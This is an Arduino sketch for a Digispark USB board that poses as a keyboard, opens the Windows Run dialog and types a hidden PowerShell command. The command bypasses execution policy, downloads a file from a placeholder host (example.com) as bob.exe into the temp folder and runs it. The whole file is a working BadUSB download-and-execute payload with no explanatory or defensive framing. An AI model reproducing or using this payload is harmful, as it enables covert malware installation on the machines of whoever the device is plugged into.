#define kbd_es_es
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.delay(5000);
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  delay(2000);
  DigiKeyboard.println("powershell -NoP -NonI -W Hidden -Exec Bypass \"IEX (New-Object System.Net.WebClient).DownloadFile('http://example.com/bob.txt',\\\"$env:temp\\bob.exe\\\"); Start-Process \\\"$env:temp\\bob.exe\\\"\"");
  delay(3000);
  while(1);
}
